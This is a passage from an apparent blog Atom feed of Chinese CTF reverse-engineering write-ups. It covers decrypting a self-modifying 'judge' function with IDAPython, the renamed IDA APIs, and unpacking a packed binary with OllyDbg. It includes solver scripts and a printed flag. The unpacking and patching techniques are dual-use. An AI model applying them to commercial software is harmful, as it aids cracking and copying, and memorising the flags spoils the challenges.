<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ss1du0us&#39;s Blog</title>
  
  <subtitle>Welcome</subtitle>
  <link href="https://www.4ss1du0us.cn/atom.xml" rel="self"/>
  
  <link href="https://www.4ss1du0us.cn/"/>
  <updated>2023-05-12T02:02:57.106Z</updated>
  <id>https://www.4ss1du0us.cn/</id>
  
  <author>
    <name>4ss1du0us</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界-BABYRE</title>
    <link href="https://www.4ss1du0us.cn/2023/059657b663.html"/>
    <id>https://www.4ss1du0us.cn/2023/059657b663.html</id>
    <published>2023-05-11T14:43:39.000Z</published>
    <updated>2023-05-12T02:02:57.106Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>了解 <mark>SMC 自解码的原理</mark>，使用 IDA 脚本破解 SMC 自解码</p></li><li><p><mark>新版 IDA 与 旧版 IDA 由于 API 改变，脚本写法有所不同</mark></p></li><li><p><mark>通过 IDA 远程调试绕过 SMC 自解码</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/8813b6340dfc4b009c45a8cf81999a3e.babyRE">攻防世界-BABYRE</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>IDA 打开，定位到主函数：<br><img src="https://s2.loli.net/2023/05/11/gPKnuVkHNarWDGQ.png" alt="攻防世界_BABYRE1.png"><br>逻辑感觉很简单<br>首先对 <code>judge[]</code> 数组做异或操作，跟进 <code>judge[]</code><br><img src="https://s2.loli.net/2023/05/11/hsX285KoIOzRJpv.png" alt="攻防世界_BABYRE2.png"><br>要求用户输入 <code>s</code>，<code>v5</code> 是 <code>s</code> 的长度，只要满足 <code>if(v5 == 14 &amp;&amp; (*judge)(s))</code> 就能得到 flag</p></li><li><p>但是乍一看，这个条件好像有哪里怪怪的<br><code>v5 == 14</code> 这个好理解，但是 <code>(*judge)(s)</code> 就很奇怪<br>前面的 <code>jugde[]</code> 是个数组，怎么这里变成一个函数了？</p></li><li><p>本来一度摸不着头脑，注意到刚开始的异或操作：<code>for ( i = 0; i &lt;= 181; ++i )</code><br>这里循环了 182 次，我们再回到 <code>judge[]</code> 定义的地方<br><code>judge</code> 的起始地址是 <code>0x600B00</code>，182 就是 <code>0xB6</code><br>那结尾的地址就是 <code>0x600B00 + 0xB6 - 1 = 0x600BB5</code></p></li><li><p>从上往下跟过去看一下 <code>judge</code> 后面的内容<br>但是内容都是这样的十六进制数据<br><img src="https://s2.loli.net/2023/05/11/CsIV793hBTronPf.png" alt="攻防世界_BABYRE3.png"></p></li><li><p>联想到程序中的数据、指令、代码其实都是二进制数据形式存放的<br><strong>于是猜测这个 <code>judge</code> 可能本来就不是一个数组，而是函数<br>这些内容其实就是函数里的数据，只是经过了加密处理，程序开头的异或操作可能就是一种对 <code>judge</code> 的解密，把 <code>judge</code> 恢复成了正常的函数</strong>（其实就是 <code>SMC</code> 自解码）</p></li><li><p><mark>首先按照这个主函数给出的逻辑对 <code>judge</code> 进行解密</mark><br>因为异或的数据比较多，输入<code>快捷键 shift + F2</code> 打开 IDA 的脚本编辑器，输入如下脚本：<br>（适用于 IDA 7.0 以后的版本）</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600B00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：<br>在 IDA 7.0 以前的版本中，这个脚本应该这么写（网上很多 WP 就是这么写的）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add <span class="token operator">=</span> <span class="token number">0x600b00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span> PatchByte<span class="token punctuation">(</span>add <span class="token operator">+</span> i<span class="token punctuation">,</span> Byte<span class="token punctuation">(</span>add <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是 IDA 7.0 以后，官方对 API 进行了更改<br>如果还是按老版本来写，会报出：<br><code>NameError: name &#39;PatchByte&#39; is not defined</code><br><code>NameError: name &#39;Byte&#39; is not defined</code><br>等错误，因为 <code>PatchByte</code>、<code>Byte</code> 已经不能直接用于新版的 IDA 了</p><p><em>详见《IDA新版与旧版的API变更》</em></p></blockquote><ol start="7"><li><p>可以看到脚本执行前后 <code>judge</code> 中数据的变化<br>脚本执行前：<br><img src="https://s2.loli.net/2023/05/12/rveSb2aGTIwgoCu.png" alt="攻防世界_BABYRE4.png"><br>脚本执行后：<br><img src="https://s2.loli.net/2023/05/12/6qwtxUERkZ5c8Oa.png" alt="攻防世界_BABYRE5.png"></p></li><li><p>接下来把这些数据转化为代码<br>从 <code>judge</code> 的首地址 <code>0x600B00</code> 开始，到结尾的位置 <code>0x600BB5</code>，一路按 <code>快捷键 C</code> 将数据转化为代码<br>遇到 IDA 弹窗的，直接转代码，无视即可<br>（<strong>或者直接在 <code>judge</code> 的首地址 <code>C</code> 一下，IDA 会一路将可以转代码的地址全部转过来，最后 <code>P</code> 一下生成函数</strong>）<br>全部 <code>C</code> 完之后如下：<br><img src="https://s2.loli.net/2023/05/11/2b6qQRcXpUwKjtD.png" alt="攻防世界_BABYRE6.png"><br><img src="https://s2.loli.net/2023/05/11/F7XnktyoxdqDfOl.png" alt="攻防世界_BABYRE7.png"><br>然后在 <code>judge</code> 首地址的位置，按 <code>快捷键 P</code> 将代码生成函数<br><img src="https://s2.loli.net/2023/05/11/3pLbUAMJl1sycvz.png" alt="攻防世界_BABYRE8.png"><br>最后，像正常函数一样按 <code>快捷键 F5</code> 就可以快乐反编译了</p></li><li><p>得到 <code>judge()</code> 函数的内容如下：<br><img src="https://s2.loli.net/2023/05/11/XkU3CTJaEFV2QWe.png" alt="攻防世界_BABYRE9.png"><br>代码逻辑比较简单，定义了 <code>v2 = &quot;fmcd\x7F&quot;</code>，<code>v3 = &quot;k7d;V&amp;#96;np&quot;</code><br>将输入异或后要与 <code>v2</code> 相等<br>根据循环次数 14 可知，这里是将 <code>v2</code> 和 <code>v3</code> 拼接起来了<br>也可以通过汇编代码查看：<br><img src="https://s2.loli.net/2023/05/11/qpvzKXx6nyFVY1b.png" alt="攻防世界_BABYRE11.png"><br>接下来编写脚本即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">"fmcd\x7Fk7d;V`;np"</span>  flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>考虑到 <code>judge</code> 是在程序执行过程中自己解码的，所以可以通过动态调试下断点，先让程序自己解码，然后我们再观察解码后的内容</p></li><li><p>由于是 Linux 端的 elf 文件，开启远程调试<br>远程调试的方法<em>详见《IDA的基础和使用》</em></p></li><li><p>在调试之前<br>先在第一条指令 <code>push    rbp</code> 的地方下一个断点<br>然后在输入 <code>call    ___isoc99_scanf</code> 的地方下断点<br>然后开始调试</p></li><li><p>程序开始时停在我们下的第一个断点处<br><img src="https://s2.loli.net/2023/05/11/KOFfhEvSrMIUYPt.png" alt="攻防世界_BABYRE12.png"><br>在第二个断点处，<code>右键 --&gt; Run to cursor</code> 直接让程序运行到这里<br><img src="https://s2.loli.net/2023/05/11/wUPhyWZE1FXQp3o.png" alt="攻防世界_BABYRE13.png"><br>可以看到，程序的 <code>RIP</code> 指向了我们第二个断点的地方：<br><img src="https://s2.loli.net/2023/05/11/rexRt9agOP2CJZq.png" alt="攻防世界_BABYRE14.png"></p></li><li><p>然后 <code>F8</code> 单步步入<br><img src="https://s2.loli.net/2023/05/11/NE5dH3jmAVRD9ZB.png" alt="攻防世界_BABYRE15.png"><br>Linux 中程序已经开始让我们输入<br>这里先随便输入一个值，例如我输入：1<br><img src="https://s2.loli.net/2023/05/11/aZhFwSmiTKMe6AP.png" alt="攻防世界_BABYRE16.png"><br>程序越过了 scanf 输入，<code>RIP</code> 指向下一条命令</p></li><li><p>由于下面的 <code>jnz     short loc_400698</code> 这一条指令会跳转到 <code>loc_400698</code><br>这个位置是输出 “Wrong!” 用的，并且会导致程序直接结束<br><img src="https://s2.loli.net/2023/05/11/J7aYA98nNG6XkEh.png" alt="攻防世界_BABYRE17.png"><br>所以我们需要<strong>在 <code>jnz     short loc_400698</code> 这一条指令之后，设置一个新的 <code>RIP</code><br>这样一来，输入 “Wrong!” 后，可以迫使程序继续跳转到我们设置的 <code>RIP</code> 的地方，从而绕过输入错误导致的退出<br>但也要注意，我们的目的是让程序自己解码 <code>judge</code> 函数后查看 <code>judge</code> 的内容<br>所以这个 RIP 一定要设置在调用 <code>judge</code> 函数之前，不然无法进入到 <code>judge</code> 函数</strong></p></li><li><p>例如，我将 <code>RIP</code> 设置在 <code>jnz     short loc_400698</code> 的后面一句，即：地址 <code>0x40067A</code> 处<br>然后 <code>右键 --&gt; set IP</code><br><img src="https://s2.loli.net/2023/05/11/7b1gZf3UITFcHaO.png" alt="攻防世界_BABYRE18.png"><br>同时，在 <code>call    rdx ; judge</code> 调用 <code>judge</code> 函数的地方 <code>F2</code> 下一个断点<br>然后我们直接 <code>F8</code> 就会跳转到刚刚设置 <code>RIP</code> 的位置，从而绕过 <code>loc_400698</code><br>继续 <code>F8</code> 执行到调用 <code>judge</code> 函数的地方，IDA 会询问是否进入这个地址<br><img src="https://s2.loli.net/2023/05/11/BmDVKEiyaZgtp1k.png" alt="攻防世界_BABYRE20.png"><br>选择 <code>&quot;Yes&quot;</code>，程序就会进入 <code>judge</code> 函数：<br><img src="https://s2.loli.net/2023/05/11/zeCXMHUOF94Rfbv.png" alt="攻防世界_BABYRE21.png"><br>这个就是程序自己解码出来的 <code>judge</code> 函数的内容<br>然后选择 <code>judge</code> 函数的内容，使用 <code>快捷键 P</code> 将代码生成函数<br><img src="https://s2.loli.net/2023/05/11/bqzUXrmZSDHWvRo.png" alt="攻防世界_BABYRE22.png"><br>最后 <code>F5</code> 即可将 <code>judge</code> 函数反汇编<br><img src="https://s2.loli.net/2023/05/11/FbgvQVzZxaoS6tm.png" alt="攻防世界_BABYRE23.png"></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{n1c3_j0b}</p></blockquote><p><img src="https://s2.loli.net/2023/05/11/kvcIy5LrVweRJB9.png" alt="攻防世界_BABYRE10.png"></p>]]></content>
    
    
    <summary type="html">攻防世界的一道 SMC 自解码题，可以使用 IDA 脚本和动态调试绕过，感觉还是比较经典的，记录一下</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>IDA新版与旧版的API变更</title>
    <link href="https://www.4ss1du0us.cn/2023/05bbb01dd.html"/>
    <id>https://www.4ss1du0us.cn/2023/05bbb01dd.html</id>
    <published>2023-05-11T08:11:01.000Z</published>
    <updated>2023-05-12T04:00:01.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDA-的变更"><a href="#IDA-的变更" class="headerlink" title="IDA 的变更"></a>IDA 的变更</h2><blockquote><p>在做逆向的时候，有时会涉及到对硬指令的更改，不论是直接修改还是异或之类的，由于数据量比较大，所以会用到 IDA 提供的脚本编辑器（<code>shift + F2</code>）</p><p>但是网上有些 WP 给出的是比较旧的 IDA 脚本，在新版 IDA 中使用会报出各种 <code>&quot;NameError: name xxx is not defined&quot;</code> 的错误，这是因为 IDA 官方在新版中修改了部分 API 的名称，导致新旧版本不互通</p></blockquote><hr><h3 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h3><ul><li>在旧版本中：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600b00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span> PatchByte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> Byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>在新版本中</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600B00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>在 IDA 7.0 以后的版本中，要将：<br><code>idc.PatchByte()</code> 改为 <code>ida_bytes.patch_byte()</code><br><code>idc.Byte()</code> 改为 <code>idc.get_wide_byte()</code></p></blockquote><hr><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><blockquote><p>网上解决方法提到了很多，但是我尝试之后，发现大部分方法在我使用的 <a href="https://www.52pojie.cn/">吾爱破解论坛</a> 版的 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> 上无效，最后我是在 IDA 官方文档上解决</p><p>为避免大家再次踩坑，所以记录一下</p></blockquote><hr><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h3><blockquote><p>Hex-Rays 在官网的 <code>The guide</code> 部分列出了新版与旧版 IDA 中 API 的名称变化，需要时可以 <code>ctrl + F</code> 自行查找 API 名称是否变动（一般旧版在函数名前加上 idc，例如 <code>idc.xxx()</code>）</p></blockquote><ul><li>官网地址：<br>  <a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">Porting from IDAPython 6.x-7.3, to 7.4</a></li></ul><hr><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><blockquote><p>其他方法在我的 IDA 版本中无效，但是也搜集了一下，说不定其他版本可以</p></blockquote><ul><li>链接：（见方法 1、方法 2）<br>  <a href="https://www.52pojie.cn/thread-1403005-1-1.html">关于IDA7.5 IDApython api差异问题及解决办法 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></li></ul>]]></content>
    
    
    <summary type="html">有时候网上的 WP 中给出的 IDA 脚本会报出 “NameError: name &#39;PatchByte&#39; is not defined” 等错误，因为有些 API 在新版中被更改了，导致 IDA 老版本与新版本脚本不互通</summary>
    
    
    
    <category term="IDA" scheme="https://www.4ss1du0us.cn/categories/IDA/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-BabyXor</title>
    <link href="https://www.4ss1du0us.cn/2023/05bc87543b.html"/>
    <id>https://www.4ss1du0us.cn/2023/05bc87543b.html</id>
    <published>2023-05-10T14:43:39.000Z</published>
    <updated>2023-05-11T06:40:33.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>使用 ESP 定律法进行脱壳</mark></p></li><li><p>使用 <code>int __cdecl _filbuf(FILE *)</code> 函数实现 <code>get</code> 输入</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1c1c2eff3fdc4f1893aa0b72c6c9f116.zip">攻防世界-BabyXor</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>用 exeinfo PE 打开：<br><img src="https://s2.loli.net/2023/05/10/6xZUPofzA9wVdbg.png" alt="攻防世界_BabyXor1.png"><br>貌似有壳，提示用 DIE v3.x 查看，但是依然检测不出来<br><img src="https://s2.loli.net/2023/05/10/g3WAI7jGzfNwYTl.png" alt="攻防世界_BabyXor2.png"></p></li><li><p>用 IDA 打开，发现无法反汇编：<br><img src="https://s2.loli.net/2023/05/10/KexoTwL3nXqHSdO.png" alt="攻防世界_BabyXor3.png"><br><img src="https://s2.loli.net/2023/05/10/Msk41ErgZ2QYPhy.png" alt="攻防世界_BabyXor4.png"></p></li><li><p>因为加了壳，IDA 中什么都看不到<br>先用 OllyDBG 打开调试：<br><img src="https://s2.loli.net/2023/05/10/Q6iRpz2SWv3morK.png" alt="攻防世界_BabyXor5.png"><br>首先看到 <code>pushad</code><br><code>pushad</code> 是将所有的寄存器压栈，一般是开始位置<br>在地址 <code>0x0043F01E</code> 之后，有很多 <code>add byte ptr ds:[eax], al</code> 的操作，无法直接看到正常的汇编代码<br>但是在地址 <code>0x0043F012</code> 到 <code>0x0043F016</code> 之间可以看到一个循环操作：</p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0043F</span><span class="token number">012</span>    <span class="token number">8033</span> <span class="token number">23</span>         xor byte ptr ds<span class="token operator">:</span><span class="token punctuation">[</span>ebx<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token number">0043F</span><span class="token number">015</span>    <span class="token number">43</span>              inc ebx<span class="token number">0043F</span><span class="token number">016</span>  <span class="token operator">^</span> E0 FA           loopdne <span class="token keyword">short</span> babyXor<span class="token punctuation">.</span><span class="token number">0043F</span><span class="token number">012</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li><p>这里使用循环 xor 来修正代码，所以导致 IDA 无法正常解析<br>从 <code>pushad</code> 开始<br><strong>先 F8 单步步过一次</strong>：<br><img src="https://s2.loli.net/2023/05/10/VJIsvz16a8pTGgD.png" alt="攻防世界_BabyXor6.png"><br><strong>观察右侧寄存器窗口，发现 EAX ~ EDI 中只有 ESP 为红色，说明可以使用 ESP 定律进行脱壳</strong></p></li><li><p>在寄存器窗口中选中 ESP，<code>右键 --&gt; 数据窗口中跟随</code><br><img src="https://s2.loli.net/2023/05/10/qQLlbHZnCFYmVDd.png" alt="攻防世界_BabyXor7.png"><br>注意数据窗口中是否跳转：<br><img src="https://s2.loli.net/2023/05/10/e93JDiVIRofkMFA.png" alt="攻防世界_BabyXor8.png"><br>从该地址处的第一个字节开始（我这里是 00），<strong>左键选择任意长度的数据</strong><br>然后<code>右键 --&gt; 断点 --&gt; 硬件访问 --&gt; Byte/Word/Dword</code>（三选一，均可）<br><img src="https://s2.loli.net/2023/05/10/iT37cBpG8DrdJmK.png" alt="攻防世界_BabyXor9.png"><br>检查一下断点是否成功：<code>调试 --&gt; 硬件断点</code><br><img src="https://s2.loli.net/2023/05/10/SdAUMkKuGnQ1ysZ.png" alt="攻防世界_BabyXor10.png"><br>直接 <code>F9</code> 运行程序<br>然后 <code>F8</code> 连续单步步过找到 OEP（程序的入口点）<br>程序停在地址 <code>0x0043F019</code> 的位置<br><img src="https://s2.loli.net/2023/05/10/VXBt9GIfqShQHlT.png" alt="攻防世界_BabyXor11.png"><br>在脱壳之前，先删除前面下的断点：<br><img src="https://s2.loli.net/2023/05/10/XStOCdQuqKDZopR.png" alt="攻防世界_BabyXor12.png"><br>在停下的地址处：<code>右键 --&gt; 用 OllyDump脱壳调试进程</code><br><img src="https://s2.loli.net/2023/05/10/gIHBRvrnyL29Nat.png" alt="攻防世界_BabyXor13.png"><br>点击脱壳，并将脱壳后的程序进行保存<br><img src="https://s2.loli.net/2023/05/10/BjzxqmA8f61heKs.png" alt="攻防世界_BabyXor14.png"></p></li><li><p>将保存后的程序用 exeinfo PE 打开：<br><img src="https://s2.loli.net/2023/05/10/X7fyaJYj4meztEL.png" alt="攻防世界_BabyXor15.png"><br>已经显示无壳<br>用 IDA 打开：<br><img src="https://s2.loli.net/2023/05/10/EjrHVPp5KotX283.png" alt="攻防世界_BabyXor16.png"><br>已经可以被 IDA 正常分析了，脱壳成功</p></li><li><p>进入主函数<br><img src="https://s2.loli.net/2023/05/10/dV2fGgTrQvclYBD.png" alt="攻防世界_BabyXor17.png"><br>开始的两句作用是输出：”世界上最简单的Xor”<br>注意到后面有一个 <code>if else</code> 语句：<br><img src="https://s2.loli.net/2023/05/10/Hv9rpZsTD7lIPE3.png" alt="攻防世界_BabyXor18.png"><br>这个不是很懂，但是在网上看到了比较好的解释：<a href="https://www.cnblogs.com/volcanol/archive/2011/06/09/2076907.html">C语言学习趣事_关于C语言中的输入输出流_续一 - volcanol</a><br>这段代码实现的是 <code>getc()</code> 函数，即：获取用户的输入<br>其实根据运行程序时的输出，也大致可以猜到，不影响做题</p></li></ol><blockquote><p><code>getc()</code></p><p>在 VC 6.0 中有两个 <code>get()</code> 的定义， 一个是宏，一个是函数</p><ol><li>宏的定义如下：<br>  <code>#define getc(_stream) (--(_stream)-&gt;_cnt &gt;= 0 ? 0xff &amp; *(_stream)-&gt;_ptr++ : _filbuf(_stream))</code></li><li>函数定义如下：<br>  <code>_CRTIMP int __cdecl getc(FILE *)</code></li></ol><p>在Ｃ语言的各家编译器提供厂商里面有一个不成为的“潜规则”，那就是：<br><strong>如果一个标识符前面是以下划线开头，这样的标识符通常是编译器预定义的宏，或者预定义的标志符</strong></p><p>我们看宏定义，这里用到的宏实际还用到了一个预定义的函数：<br><code>_CRTIMP int __cdecl _filbuf(FILE *)</code></p><p>从这个函数可以看出在 <code>getc()</code> 宏中使用的：<code>_stream</code> 是一个具有文件指针类型性质的预定义标识符</p></blockquote><p>在 IDA 伪代码中，<code>_filbuf(&amp;File)</code> 的定义：<br><img src="https://s2.loli.net/2023/05/10/DTBwrIKJeYtZ24a.png" alt="攻防世界_BabyXor19.png"></p><ol start="8"><li><p>继续往下：<br><code>v8 = sub_40108C(&amp;unk_435DC0, 56)</code> 函数会执行 <code>sub_401190(a1, a2)</code>：<br><img src="https://s2.loli.net/2023/05/10/Anc6z4y2wRHFJk5.png" alt="攻防世界_BabyXor20.png"><br>内容就是简单的移位、异或操作，最后将结果返回给 <code>v8</code><br><code>Src = sub_401041(&amp;unk_435DC0, &amp;dword_435DF8, 0x38u)</code> 函数会执行 <code>sub_401240(a1, a2, Size)</code>：<br><img src="https://s2.loli.net/2023/05/10/XHVuJIs82ERmT1W.png" alt="攻防世界_BabyXor21.png"><br>操作也是移位、异或，将结果返回给 <code>Src</code><br><code>v5 = sub_4010C3(&amp;unk_435DC0, Src, &amp;dword_435E30, 56)</code> 函数会执行 <code>sub_401320(a1, a2, a3, a4)</code>：<br><img src="https://s2.loli.net/2023/05/10/ZnK8s9Awu1vCUOS.png" alt="攻防世界_BabyXor22.png"><br>跟前面都是差不多的，也是移位、异或，最后将结果返回给 <code>v5</code><br>最后执行 <code>sub_40101E(v8, Src, v5)</code>：<br><img src="https://s2.loli.net/2023/05/10/g1bOINW2muM9Un7.png" alt="攻防世界_BabyXor23.png"><br>发现三个通过 <code>for</code> 循环的赋值操作<br>同时，三个参数都使用 <code>sub_4010A5()</code> 函数进行了处理，<code>sub_4010A5()</code> 函数会执行 <code>sub_401460(a1)</code><br>跟进一下：<br><img src="https://s2.loli.net/2023/05/10/4GyluCoDmJpIbSz.png" alt="攻防世界_BabyXor24.png"><br>这里的 <code>i</code> 是一个指针，<code>a1</code> 也是一个指针<br>首先将 <code>i</code> 的初值设置为 <code>a1</code> 所指向的地址（其实就是参数 <code>v8</code>、<code>Src</code>、<code>v5</code> 各自的首地址）<br>for 循环的结束条件就是将 <code>a1</code> 所指向的非 <code>&#39;\0&#39;</code> 元素全部遍历完，也就是 <code>i</code> 指向参数 <code>v8</code>、<code>Src</code>、<code>v5</code> 各自的末尾<br>最后返回的 <code>i - a1</code> 是两个地址的差，差值其实就是字符串的长度<br>再结合三个 for 循环的内容，可知：<br><code>sub_40101E(v8, Src, v5)</code> 函数的功能是将 a1( <code>v8</code> )、a2( <code>Src</code> )、a3( <code>v5</code> ) 的内容拼接到 <code>v10</code> 所指向的地址中</p></li><li><p>查看一下这三个移位、异或函数所使用的数据<br><code>unk_435DC0</code>：<br><img src="https://s2.loli.net/2023/05/10/PkDSmgbG6hvIrMa.png" alt="攻防世界_BabyXor25.png"><br><code>dword_435DF8</code>：<br><img src="https://s2.loli.net/2023/05/10/2dBfQnb8aqUWMIu.png" alt="攻防世界_BabyXor26.png"><br><code>dword_435E30</code>：<br><img src="https://s2.loli.net/2023/05/10/7bSMKYAIJ81NWRX.png" alt="攻防世界_BabyXor27.png"></p></li><li><p>通过 IDA 生成 Python 列表：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token 